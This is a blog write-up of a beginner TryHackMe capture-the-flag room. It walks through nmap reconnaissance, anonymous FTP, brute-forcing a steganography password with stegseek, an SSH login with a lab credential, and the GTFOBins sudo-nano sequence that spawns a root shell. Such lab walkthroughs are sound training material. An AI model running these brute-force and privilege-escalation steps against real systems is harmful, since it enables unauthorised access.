---
title: TryHackMe Brooklyn Nine Nine [CHALLENGE]
date: 2024-03-14 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg
---

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

## **Reconnaissance**
---
Initially do the Nmap scan.

```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 04:31 EDT
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.15% done; ETC: 04:33 (0:01:42 remaining)
Nmap scan report for 10.10.145.160
Host is up (0.30s latency).
Not shown: 65399 closed tcp ports (conn-refused), 133 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.50.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.31 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

TARGET IP: 10.10.145.160

80 → HTTP

- There is a clue from the source code about **steganography**
- The background image is password protected

21 → FTP

- Anonymous login is allowed
- There is a note saying that Jake has a weak password. From Amy.

22 → SSH

- There are possible 3 usernames.
    - Amy:?
    - Jake:?
    - Holts. Is this another username
        - Extracted from the background image.
- Found a password
    - holt: fluffydog12@ninenine

## **Enumeration**
---
### 80 HTTP

Viewing the page source code

![Desktop View](/assets/images/brooklyn/source-code.png){: width="972" height="589" }

It looks like we will be using some steganography tools. Maybe from the background image of the webpage since there is a big emphasis on how the background image follows the screen resolution. But how do we get the file?

![Desktop View](/assets/images/brooklyn/get-file.png){: width="972" height="589" }

Looking at the source code, the `url()` function is used to include an external resource. In this case, it's referring to an image file named **brooklyn99.jpg**. We can access it by:

```bash
http://10.10.145.160/brooklyn99.jpg
```
Before anything else, read about [Steganography by freecodecamp](https://www.freecodecamp.org/news/what-is-steganography-hide-data-inside-data/) first.

We need to extract what's hidden from the background image using steghide. You can use the --help page for steghide if you don't understand the flag being used.

```bash
steghide extract -sf brooklyn99.jpg -xf image-extract.txt
```

And it looks like the image is password protected. Let us use stegseek to bruteforce the password.

```bash
stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
![Desktop View](/assets/images/brooklyn/stegseek.png){: width="972" height="589" }

**Use the steghide again** to extract the information from the background image and enter the password we got from bruteforcing using `stegseek`. Once extracted, view the text file.

```bash
steghide extract -sf brooklyn99.jpg -xf image-extract.txt
```
![Desktop View](/assets/images/brooklyn/steghide.png){: width="972" height="589" }

GOOD DOG! Cheddar!! We got the password, but who uses that? We can search for possible usernames in the FTP.

### 21 FTP

```bash
ftp <IP>
```
![Desktop View](/assets/images/brooklyn/ftp.png){: width="972" height="589" }

```bash
ls -la
```
![Desktop View](/assets/images/brooklyn/ls.png){: width="972" height="589" }

```bash
get <FILENAME>
```
![Desktop View](/assets/images/brooklyn/getfile.png){: width="972" height="589" }

Go back to working directory of the attack machine and view the text file.

![Desktop View](/assets/images/brooklyn/weak.png){: width="972" height="589" }

Can we hail hydra? Or Just use the credentials we just found from the text file hiding in the background image and the text file we got from the FTP.




## **Gaining an Initial Foothold**
---

Login via SSH. I tried using holt as the username, if it did not work, using hydra would be our best bet. Enter the password when prompted.

```bash
ssh holt@<IP>
```
![Desktop View](/assets/images/brooklyn/ssh.png){: width="972" height="589" }

> Do not forget to find the FLAGS
{: .prompt-danger }


## **Privilege Escalation**
---

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file.

![Desktop View](/assets/images/brooklyn/sudo.png){: width="972" height="589" }

It looks like our user is allowed to run `nano` as a superuser without a password. This means that we can open the final flag by leveraging the `sudo` command or just use the code below from GTFO bins to **spawn a root shell**.

![Desktop View](/assets/images/brooklyn/sudo-nano.png){: width="972" height="589" }

Using GTFOBins
```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

```bash
Ctrl + R
```
Nano allows inserting external files into the current one using the shortcut

```bash
Ctrl + X
```
This command allows us to execute system level commands using

```bash
reset; sh 1>&0 2>&0
```
Allows us to spawn a shell

![Desktop View](/assets/images/brooklyn/root-gtfo.png){: width="972" height="589" }

![Desktop View](/assets/images/brooklyn/pwned.png){: width="972" height="589" }


> Do not forget to find the FLAGS
{: .prompt-danger }

## **Take Away Concepts**
---
- Understand steganography. Sometimes, these pictures might have the passwords or hints you need to get on top of the machine.
- Always check websites or web apps carefully by yourself. View the page source!
- If the binary /bin/nano has extra permissions, you can use this to your advantage to escalate your privilege. Make sure you understand how this trick works instead of just copying blindly from GTFObins.
- Pay close attention to any hints given.
- Don't worry about checking different network services if you're stuck. You can always take notes and come back later.
- Trying to bruteforce passwords right away isn't the best first step. Make sure you've tried all other options first to gain an initial foothold!